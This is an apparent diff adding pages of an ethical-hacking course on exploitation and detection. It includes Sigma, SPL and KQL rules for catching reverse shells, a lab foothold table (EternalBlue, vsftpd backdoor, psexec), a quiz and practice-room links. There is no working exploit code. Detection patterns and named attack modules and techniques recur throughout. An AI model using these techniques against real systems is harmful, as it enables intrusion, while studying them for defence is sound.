+      <p class="lede">You have exploited all afternoon. Here is the other side &mdash; the process, network and IDS events a SOC analyst actually triages.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">Why exploitation is where detection pays off</span><p>Recon is quiet and cracking is offline &mdash; but exploitation <strong>runs code and opens a connection</strong>, and both are loud. A service that suddenly spawns <span class="mono">cmd.exe</span>, an outbound connection from a web server to a random host, an EternalBlue signature &mdash; these are high-signal. Learn the pairs and you can sit on either side.</p></div>      <figure class="dgm interactive">
+        <svg viewBox="0 0 940 300" role="img" aria-label="Interactive map: three exploitation actions in orange on the left, each paired with the defender evidence in green on the right. Click each attack.">
+          <text x="235" y="26" text-anchor="middle" font-size="13" class="d-title" fill="#ff7043">ATTACKER did</text>
+          <text x="705" y="26" text-anchor="middle" font-size="13" class="d-title" fill="#4ade80">SOC sees</text>
+          <line x1="470" y1="40" x2="470" y2="286" stroke="#333b4c" stroke-width="1.2" stroke-dasharray="3 4"/>
+          <g class="node" data-node="proc" tabindex="0"><rect x="20" y="48" width="430" height="66" rx="8" fill="#1a1f2a" stroke="#ff7043"/><text class="d-lbl" x="38" y="72" font-size="12">Exploit &rarr; new process (Lab 3/5)</text><text class="d-sub" x="38" y="92">a service spawns cmd.exe / powershell</text><text class="d-sub" x="38" y="107" class="d-mono">meterpreter / reverse shell</text></g>
+          <rect x="490" y="48" width="430" height="66" rx="8" fill="#12241c" stroke="#4ade80"/><text class="d-lbl" x="508" y="72" font-size="13" fill="#4ade80" class="d-mono">4688 / Sysmon 1</text><text class="d-sub" x="640" y="72">process creation</text><text class="d-sub" x="508" y="92">unusual parent &rarr; child (services.exe &rarr; cmd.exe)</text><text class="d-sub" x="508" y="107">the tell: who spawned the shell</text><path d="M450,81 L488,81" stroke="#768290" stroke-width="1.5" marker-end="url(#ar-g)"/>
+          <g class="node" data-node="net" tabindex="0"><rect x="20" y="126" width="430" height="66" rx="8" fill="#1a1f2a" stroke="#ff7043"/><text class="d-lbl" x="38" y="150" font-size="12">Reverse shell &rarr; callback (Lab 4/5)</text><text class="d-sub" x="38" y="170">target dials OUT to the attacker</text><text class="d-sub" x="38" y="185" class="d-mono">LPORT 443 / 53 to blend in</text></g>
+          <rect x="490" y="126" width="430" height="66" rx="8" fill="#12241c" stroke="#4ade80"/><text class="d-lbl" x="508" y="150" font-size="13" fill="#4ade80" class="d-mono">Sysmon 3</text><text class="d-sub" x="612" y="150">network connection</text><text class="d-sub" x="508" y="170">cmd.exe/powershell making an outbound connection</text><text class="d-sub" x="508" y="185">a shell process should never talk to the internet</text><path d="M450,159 L488,159" stroke="#768290" stroke-width="1.5" marker-end="url(#ar-g)"/>
+          <g class="node" data-node="ids" tabindex="0"><rect x="20" y="204" width="430" height="66" rx="8" fill="#1a1f2a" stroke="#ff7043"/><text class="d-lbl" x="38" y="228" font-size="12">EternalBlue / meterpreter (Lab 3)</text><text class="d-sub" x="38" y="248">known exploit + payload on the wire</text><text class="d-sub" x="38" y="263" class="d-mono">MS17-010 SMBv1 packets</text></g>
+          <rect x="490" y="204" width="430" height="66" rx="8" fill="#12241c" stroke="#4ade80"/><text class="d-lbl" x="508" y="228" font-size="13" fill="#4ade80">IDS / IPS</text><text class="d-sub" x="560" y="228">Suricata / Snort ET rules</text><text class="d-sub" x="508" y="248">ET EXPLOIT MS17-010 ; meterpreter stager</text><text class="d-sub" x="508" y="263">near-real-time &mdash; often before the shell lands</text><path d="M450,237 L488,237" stroke="#768290" stroke-width="1.5" marker-end="url(#ar-g)"/>
+        </svg>
+        <div class="dgm-hint">Click each &mdash; the exact signal, and the field a Lab 9 rule keys on.</div>
+        <div class="dgm-detail" data-detail="proc"><h5><span class="dd-tag">T1059 · PROCESS &rarr; 4688 / Sysmon 1</span>Who spawned the shell</h5><p><b>A shell process (cmd.exe, powershell, /bin/sh) with an unexpected parent.</b> A web server (w3wp.exe) or a service spawning a command interpreter is the single strongest host signal of exploitation. Rule: <span class="mono">ParentImage</span> in (service/web) AND <span class="mono">Image</span> ends in cmd/powershell/sh.</p></div>
+        <div class="dgm-detail" data-detail="net"><h5><span class="dd-tag">T1571 · NETWORK &rarr; Sysmon 3</span>The callback</h5><p><b>An outbound connection from a process that has no business making one.</b> The reverse shell&#39;s whole trick &mdash; riding outbound trust &mdash; is also its tell: <span class="mono">cmd.exe</span> connecting to a random external IP on 443 is not normal. Rule: Sysmon 3 where <span class="mono">Image</span> is a shell/interpreter.</p></div>
+        <div class="dgm-detail" data-detail="ids"><h5><span class="dd-tag">T1210 · IDS/IPS</span>Known bytes on the wire</h5><p><b>Signature engines match the exploit and payload directly.</b> EternalBlue&#39;s SMBv1 packets and the meterpreter stager are heavily signatured &mdash; Suricata/Snort ET rules fire in near-real-time, frequently before the session opens. This is why loud exploits like EternalBlue are caught fast.</p></div>
+      </figure>
+      <div class="box key-takeaway"><span class="box-t">The rule you are about to write</span><p><strong class="hl hl-d">A shell is a process with a parent and a connection.</strong> The most durable detection is not the exploit bytes (they change) but the behaviour after: the wrong parent spawning a shell, and that shell reaching out. That is your Lab 9 rule.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="Lab 9: write the rule">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S05 &middot; P22</span><span class="tag lab">Hands-on · everyone · the signature exercise</span><span class="time">&#9201; 16 min</span></div>
+      <h1>Lab 9 &mdash; Detect the Shell You Just Caught</h1>
+      <p class="lede">Become the SOC analyst who catches you &mdash; from the process and network evidence your own exploits generated this session.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">Why this is the exercise that defines the session</span><p>You generated the evidence in Labs 3&ndash;5: a service spawning a shell (4688 / Sysmon 1), and that shell calling out (Sysmon 3). Now read it as a defender and write one <strong>working detection rule</strong> that fires on a reverse shell &mdash; regardless of which exploit delivered it. This is the tier-1-into-tier-2 SOC job, on events you produced yourself.</p></div><div class="box warn"><span class="box-t">You need the evidence from Labs 3&ndash;5</span><p>Have your saved Sysmon/Security logs open (<span class="mono">saved/lab3_eternalblue_sysmon.evtx</span>, <span class="mono">saved/lab5_revshell_sysmon.evtx</span>). No lab? The fallbacks contain the exact events described below.</p></div>      <h2><span class="h-t">The worked rule &mdash; Sigma (behavioural, exploit-agnostic)</span></h2>
+      <p>The durable detection is the <b>behaviour</b>, not the exploit: a shell interpreter whose <b>parent is a server/service</b> and that then makes an
+         <b>outbound connection</b>. Written once in Sigma, it fires on EternalBlue, msfvenom, a web-shell &mdash; any delivery.</p>
+      <pre><code>title: Reverse Shell - Server Process Spawns Interpreter
+logsource:
+  category: process_creation
+  product: windows
+detection:
+  parent_server:
+    ParentImage|endswith:
+      - '\services.exe'
+      - '\w3wp.exe'
+      - '\sqlservr.exe'
+      - '\httpd.exe'
+  shell_child:
+    Image|endswith:
+      - '\cmd.exe'
+      - '\powershell.exe'
+  condition: parent_server and shell_child
+tags: [attack.execution, attack.t1059, attack.t1210]
+level: high</code></pre>
+      <p>Pair it with a network rule &mdash; Sysmon Event ID 3 where the initiating <span class="mono">Image</span> is <span class="mono">cmd.exe</span>/
+         <span class="mono">powershell.exe</span> connecting to a non-internal address &mdash; and a single reverse shell trips <em>both</em>.</p>
+
+      <h2><span class="h-t">Now you write one &mdash; pick your platform</span></h2>
+      <div class="split">
+        <div>
+          <p class="mono" style="color:#22d3ee">Splunk (SPL) &mdash; complete this skeleton</p>
+          <pre><code>index=win EventCode=1
+| search parent_process_name IN ("services.exe","w3wp.exe","sqlservr.exe")
+         process_name IN ("cmd.exe","powershell.exe")
+| stats count by Computer, parent_process_name, process_name, _time
+| where ____   &lt;-- your threshold / correlation with a Sysmon 3 egress</code></pre>
+        </div>
+        <div>
+          <p class="mono" style="color:#22d3ee">Microsoft Sentinel (KQL) &mdash; complete this skeleton</p>
+          <pre><code>DeviceProcessEvents
+| where InitiatingProcessFileName in~ ("services.exe","w3wp.exe","sqlservr.exe")
+| where FileName in~ ("cmd.exe","powershell.exe")
+| join kind=inner (DeviceNetworkEvents
+    | where InitiatingProcessFileName in~ ("cmd.exe","powershell.exe"))
+    on DeviceId
+| where ____   &lt;-- your outbound / non-RFC1918 condition</code></pre>
+        </div>
+      </div>
+      <ol class="steps">
+<li>
+<strong>Read the evidence and name the attack</strong> from the logs alone &mdash; do not look at your own commands.
+<div class="verify"><h4>&#10003; Verification</h4><ul><li>You identified: parent process, the spawned shell, the outbound destination and port</li></ul></div>
+</li>
+<li>
+<strong>Write ONE complete, working rule</strong> in Sigma, SPL or KQL that would fire on your reverse shell.
+<div class="verify"><h4>&#10003; Verification</h4><ul><li>The rule keys on the parent&rarr;child relationship (not the exploit bytes)</li><li>It correlates or thresholds so a normal admin cmd.exe does not drown it in false positives</li></ul></div>
+</li>
+<li>
+<strong>Test it against a benign baseline</strong> &mdash; would a normal user opening PowerShell trip it? Tune the parent list.
+<div class="verify"><h4>&#10003; Verification</h4><ul><li>You can state one false-positive source and how your rule avoids it</li></ul></div>
+</li>
+</ol><div class="box key-takeaway"><span class="box-t">What you produced</span><p>One working reverse-shell detection rule, from evidence you generated by attacking. The honest point to end on: <strong>EDR and IDS flag meterpreter and EternalBlue in near-real-time</strong> &mdash; the modern attacker&#39;s hard problem is not getting a shell, it is keeping it quiet, which is Session 6/7.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="Lab 10: the foothold record">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S05 &middot; P23</span><span class="tag lab">Hands-on · teams · the deliverable</span><span class="time">&#9201; 12 min</span></div>
+      <h1>Lab 10 &mdash; Assemble the Foothold Record</h1>
+      <p class="lede">The deliverable: one row per host you landed on, in a form Session 6 starts from. Conclusions, not command dumps.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">Why this is the artefact that matters</span><p>Session 4 handed you an access plan; today you executed it. The <strong>foothold record</strong> captures the result &mdash; and because privilege escalation (Session 6) begins from <em>the user context you landed as</em>, this record is literally its input. Fill one block per host.</p></div>      <div class="tbl-scroll">
+      <table><colgroup><col style="width:18%"><col style="width:26%"><col style="width:20%"><col style="width:21%"><col style="width:15%"></colgroup>
+        <thead><tr><th>Host</th><th>Got in via</th><th>Payload / shell</th><th>Landed as</th><th>Proof</th></tr></thead>
+        <tbody>
+          <tr><td>WIN7-TGT01</td><td>EternalBlue (MS17-010)</td><td>staged meterpreter</td><td class="mono" style="color:#e63946">NT AUTHORITY\SYSTEM</td><td>getuid + -=WIN=-</td></tr>
+          <tr><td>METASPLOITABLE2</td><td>vsftpd 2.3.4 backdoor</td><td>bind shell :6200</td><td class="mono" style="color:#4ade80">root</td><td>id = uid=0</td></tr>
+          <tr><td>DC / ceh.lab</td><td>credential (m.said, S4 spray)</td><td>psexec</td><td class="mono" style="color:#e63946">NT AUTHORITY\SYSTEM</td><td>whoami</td></tr>
+          <tr><td>WIN10-TGT01</td><td>BOF (vulnserver)</td><td>shell_reverse_tcp</td><td class="mono">win10\lab (low-priv)</td><td>whoami</td></tr>
+        </tbody>
+      </table>
+      </div>
+      <div class="box lab-box"><span class="box-t">Open the team report</span><p>Record each foothold in your cumulative <a href="report.html">Team Report</a> &mdash; it carries forward from S2&ndash;S4 and exports the whole engagement to HTML/PDF. Grade: <b>pass</b> = per-host exploit/cred + payload + shell type + <em>user context</em> + proof; <b>needs-review</b> = a pile of raw msfconsole output with no conclusions.</p></div><div class="box key-takeaway"><span class="box-t">The single most important field</span><p><strong class="hl">&quot;Landed as.&quot;</strong> SYSTEM on Win7 means privesc there is already done; low-priv on Win10 means Session 6 has work to do. That one column decides where next session starts on each host.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="Into Session 6">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S05 &middot; P24</span><span class="tag theory">Bridge · concept only</span><span class="time">&#9201; 6 min</span></div>
+      <h1>You Have a Shell. Whose Shell Is It?</h1>
+      <p class="lede">Session 6 starts exactly where your foothold record ends &mdash; from the user you landed as, to the one you want.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">Why the user context is the whole bridge</span><p>Every row in your foothold record has a &quot;landed as.&quot; Some say SYSTEM/root &mdash; you are already king on that host. Most say a low-privilege user. Session 6 &mdash; <strong>Privilege Escalation &amp; Capstone</strong> &mdash; is the art of turning the second into the first.</p></div>      <div class="split">
+        <div class="box attacker-view"><span class="box-t">From your low-priv shells</span><p>Windows: misconfigured services, token abuse, <span class="mono">mimikatz</span> on LSASS (introduced in S4), unquoted paths, AlwaysInstallElevated. Linux: SUID binaries, sudo misconfig, cron jobs, writable paths, kernel exploits. All start from the shell you caught today.</p></div>
+        <div class="box defender-view"><span class="box-t">And its SOC flip</span><p>Privilege escalation is loud too &mdash; a low-priv user suddenly running as SYSTEM, new services, token manipulation. The detection habit you built in Lab 9 carries straight into Session 6.</p></div>
+      </div>
+      <div class="box key-takeaway"><span class="box-t">The through-line of the whole diploma</span><p>Recon (S2) &rarr; scan (S3) &rarr; vuln + creds (S4) &rarr; <strong>shell (S5)</strong> &rarr; <strong>privesc + capstone (S6)</strong>. One target, one chain, one continuous story &mdash; and you are five-sixths of the way through it.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="Knowledge check">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S05 &middot; P25</span><span class="tag theory">Wrap-up · self-scoring</span><span class="time">&#9201; 8 min</span></div>
+      <h1>Knowledge Check</h1>
+      <p class="lede">Six questions. Answer before you reveal &mdash; each explains the &quot;why,&quot; not just the letter.</p>
+    </div>
+    <div class="content">
+<div class="q mcq" data-correct="c" data-why="A reverse shell has the TARGET connect OUT to the attacker, which firewalls normally allow; a bind shell needs an inbound connection, which they normally block.">
+  <p><span class="qn">Q1</span>Why do reverse shells succeed where bind shells fail on most networks?</p>
+  <ul class="opts"><li data-opt="a">Reverse shells are encrypted and bind shells are not</li><li data-opt="b">Bind shells need administrator rights</li><li data-opt="c">The target connects OUT in a reverse shell, and firewalls allow outbound far more than inbound</li><li data-opt="d">Reverse shells use UDP, which bypasses firewalls</li></ul>
+  <div class="mcq-fb"></div>
+</div>
+<div class="q mcq" data-correct="b" data-why="The slash means staged: a small stager runs first and downloads the stage from your handler, so the handler must be up. The underscore form is stageless.">
+  <p><span class="qn">Q2</span>What does the <span class="mono">/</span> in <span class="mono">windows/x64/meterpreter/reverse_tcp</span> tell you?</p>
+  <ul class="opts"><li data-opt="a">It is a bind payload</li><li data-opt="b">It is STAGED &mdash; a small stager fetches the full payload, so the handler must be listening</li><li data-opt="c">It is stageless and self-contained</li><li data-opt="d">It only works on x86</li></ul>
+  <div class="mcq-fb"></div>
+</div>
+<div class="q mcq" data-correct="c" data-why="Metasploit automates find/configure/fire (steps 4-6). It never reads and understands the exploit for you (step 3) &mdash; that is the analyst's job.">
+  <p><span class="qn">Q3</span>Which step of the exploitation pipeline does Metasploit NOT do for you?</p>
+  <ul class="opts"><li data-opt="a">Firing the exploit</li><li data-opt="b">Configuring RHOSTS/LHOST</li><li data-opt="c">Reading and understanding what the exploit does before you run it</li><li data-opt="d">Catching the shell</li></ul>
+  <div class="mcq-fb"></div>
+</div>
+<div class="q mcq" data-correct="a" data-why="EternalBlue exploits the SMB service, which runs as SYSTEM in the kernel context &mdash; so code execution lands as SYSTEM with no separate escalation step.">
+  <p><span class="qn">Q4</span>Why does EternalBlue give you SYSTEM directly, with no privilege escalation?</p>
+  <ul class="opts"><li data-opt="a">It corrupts kernel memory in the SMB service, which runs as SYSTEM</li><li data-opt="b">It cracks the Administrator password</li><li data-opt="c">It disables UAC first</li><li data-opt="d">It uses a stolen token</li></ul>
+  <div class="mcq-fb"></div>
+</div>
+<div class="q mcq" data-correct="b" data-why="Controlling EIP means you decide the return address &mdash; where the CPU executes next. That is the pivot from a crash to running your code.">
+  <p><span class="qn">Q5</span>In a stack overflow, why is &quot;controlling EIP&quot; the milestone?</p>
+  <ul class="opts"><li data-opt="a">It leaks the stack canary</li><li data-opt="b">EIP is the return address &mdash; control it and you control what code runs next</li><li data-opt="c">It disables DEP</li><li data-opt="d">It gives you the base address of the binary</li></ul>
+  <div class="mcq-fb"></div>
+</div>
+<div class="q mcq" data-correct="c" data-why="The durable detection is the behaviour after delivery: a server/service process spawning a shell that then calls out. Exploit bytes change; that relationship does not.">
+  <p><span class="qn">Q6</span>What is the most durable way to detect a reverse shell, regardless of the exploit used?</p>
+  <ul class="opts"><li data-opt="a">Signature the exploit&#39;s bytes on the wire</li><li data-opt="b">Block port 4444</li><li data-opt="c">Alert when a server/service process spawns a shell interpreter that then makes an outbound connection</li><li data-opt="d">Look for the string &#39;meterpreter&#39; in memory</li></ul>
+  <div class="mcq-fb"></div>
+</div>
+    </div>
+  </section>
+  <section class="page" data-title="Practice range &amp; plan">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S05 &middot; P26</span><span class="tag theory">Practise today&#39;s attacks &mdash; free</span><span class="time">&#9201; 6 min</span></div>
+      <h1>Practise Today&#39;s Attacks &mdash; Free</h1>
+      <p class="lede">A fully free path on TryHackMe that runs today&#39;s exact skills: EternalBlue, Metasploit, and Windows exploitation.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">How to use this list</span><p>The local lab is the spine &mdash; these rooms are for repetition on the platform. Every room below was verified free the reliable way (the room API), and ordered by <em>what to do first</em>. Do Blue first: it is Lab 3 on the platform.</p></div>      <div class="practice">
+        <div class="practice-h"><span class="pr-t">Practice this session</span><span class="pr-plat">TryHackMe · free path</span></div>
+        <p class="pr-why">EternalBlue and Metasploit, exactly as taught today &mdash; then two more Windows-exploitation boxes to cement the workflow.</p>
+        <ul class="pr-list">
+        <li><div class="pr-row"><a href="https://tryhackme.com/room/blue" target="_blank" rel="noopener">Blue</a><span class="res-tag free">Free</span><span class="pr-meta">~45 min · easy</span></div><p class="pr-note"><b>Lab 3 on the platform:</b> scan &rarr; MS17-010 &rarr; <span class="mono">ms17_010_eternalblue</span> &rarr; SYSTEM, then loot. <b>Do this first</b> &mdash; it is today&#39;s flagship exploit end to end.</p></li><li><div class="pr-row"><a href="https://tryhackme.com/room/metasploitintro" target="_blank" rel="noopener">Metasploit: Introduction</a><span class="res-tag free">Free</span><span class="pr-meta">~30 min · easy</span></div><p class="pr-note">The module model from page 5 &mdash; <span class="mono">search/use/show options/set/exploit</span>, payloads and sessions. <b>Do this</b> if msfconsole still feels unfamiliar.</p></li><li><div class="pr-row"><a href="https://tryhackme.com/room/ice" target="_blank" rel="noopener">Ice</a><span class="res-tag free">Free</span><span class="pr-meta">~40 min · easy</span></div><p class="pr-note">A vulnerable Windows service exploited via Metasploit, then a first taste of post-exploitation. <b>Do this</b> to practise a non-EternalBlue module.</p></li><li><div class="pr-row"><a href="https://tryhackme.com/room/blaster" target="_blank" rel="noopener">Blaster</a><span class="res-tag free">Free</span><span class="pr-meta">~50 min · easy</span></div><p class="pr-note">Windows exploitation + a manual privilege-escalation taste &mdash; the bridge into Session 6. <b>Do this last</b> of the four.</p></li>
+        </ul>
+      </div>
+      <div class="box note"><span class="box-t">Buffer-overflow practice (verify tier on the day)</span><p>For the BOF chain, the classic free room is <b>Buffer Overflow Prep</b> (Tib3rius) &mdash; ten OSCP-style overflows with mona. Confirm it is still free on the platform before you rely on it in class; if it has moved to premium, the guided Lab 8 + the saved states are the fallback.</p></div><div class="box warn"><span class="box-t">One rule for all of these</span><p>Every room is an <em>authorised</em> target you deploy for yourself. The instant you point today&#39;s tools at anything you were not given, it is a crime &mdash; the same authorisation line that has run through every session.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="Takeaways &amp; homework">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S05 &middot; P27</span><span class="tag theory">Wrap-up</span><span class="time">&#9201; 5 min</span></div>
+      <h1>Takeaways &amp; Homework</h1>
+      <p class="lede">Six lines to keep, and the work that turns today&#39;s watching into doing.</p>
+    </div>
+    <div class="content">
+      <div class="split">
+        <div class="box key-takeaway"><span class="box-t">The six lines</span><p><b>1.</b> A credential is an exploit, an exploit is a shell. &nbsp; <b>2.</b> Read the exploit before you run it &mdash; the framework never does. &nbsp; <b>3.</b> Reverse beats bind because firewalls fear inbound, not outbound. &nbsp; <b>4.</b> Staged is small but needs the handler up; stageless is whole but big. &nbsp; <b>5.</b> Control EIP and you control what runs &mdash; that is RCE. &nbsp; <b>6.</b> A shell is a process with a parent and a connection &mdash; that is how you catch one.</p></div>
+        <div class="box soc"><span class="box-t">Where you are in the chain</span><p>You can now turn a matched CVE or a credential into a shell, keep it usable, and detect it. Session 6 takes that shell from low-priv to total control, and ties the whole engagement into a capstone.</p></div>
+      </div>
+      <h2><span class="h-t">Homework</span></h2>
+      <div class="box lab-box"><span class="box-t">Due before Session 6</span><p><b>1.</b> Complete the <b>foothold record</b> for every host you landed on &mdash; the &quot;landed as&quot; column is mandatory. &nbsp; <b>2.</b> Finish the <b>Blue</b> room on TryHackMe and paste your <span class="mono">getuid</span> proof. &nbsp; <b>3.</b> Write your <b>Lab 9 detection rule</b> in your chosen language (Sigma/SPL/KQL) and note one false-positive source it survives. &nbsp; <b>4.</b> One paragraph: for one low-priv foothold, name two privilege-escalation checks you would run first (reading ahead to Session 6).</p></div><div class="box note"><span class="box-t">Bring to Session 6</span><p>Your completed foothold record and at least one <strong>low-privilege</strong> shell you can reproduce &mdash; that is the raw material privilege escalation works on.</p></div>
+    </div>
+  </section>
+
+  <div class="pagenav">
+    <a href="#" id="btnPrev"><small>Previous</small><span class="lbl">&mdash;</span></a>
+    <a href="#" id="btnNext" class="next"><small>Next</small><span class="lbl">&mdash;</span></a>
+  </div>
+  <p class="kbd-hint">Navigate with <span class="kbd">&larr;</span> <span class="kbd">&rarr;</span> arrow keys ·
+     <span class="kbd">Home</span> / <span class="kbd">End</span> to jump</p>
+
+  </article>
+</div>
+</div>
+
+<footer class="site-foot">
+  <div class="wrap"><p>CEH Diploma · ITGate Academy · Session 05 — System Hacking II</p></div>
+</footer>
+
+<script src="../assets/js/session.js"></script>
+</body>
+</html>
